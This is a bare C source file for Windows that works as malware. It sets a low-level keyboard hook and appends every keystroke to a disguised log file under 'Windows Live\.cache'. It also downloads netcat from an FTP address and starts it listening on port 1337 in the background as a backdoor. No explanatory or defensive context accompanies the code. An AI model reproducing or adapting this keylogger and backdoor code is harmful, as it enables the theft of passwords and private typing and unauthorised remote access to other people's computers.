#include <windows.h>
#include <stdio.h>
#include <UrlMon.h>


#pragma comment(lib, "Winhttp.lib")
#pragma comment(lib, "UrlMon.lib") 


FILE *file = fopen("C:\\Program Files\\Common Files\\Windows Live\\.cache\\cache_0.ini","a+");


__declspec(dllexport)LRESULT CALLBACK KeyEvent (int nCode, WPARAM wParam, LPARAM lParam) {
    if  ((nCode == HC_ACTION) && ( (wParam == WM_SYSKEYDOWN)||(wParam == WM_KEYDOWN)) ) {
		char buf[2]={(*(KBDLLHOOKSTRUCT*)lParam).vkCode,0};
        fputs(buf,file);
        fflush(file);
    }
	return 0;
}


int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow){
	char url[] = "ftp://.../nc.exe";
	char path[] = "nc.exe";
	URLDownloadToFile(0, url, path, 0, 0);
	system("start /b nc.exe -l -p 1337");


  SetWindowsHookEx (WH_KEYBOARD_LL, (HOOKPROC) KeyEvent, 0, NULL);
  GetMessage(NULL,NULL,0,0);	
}
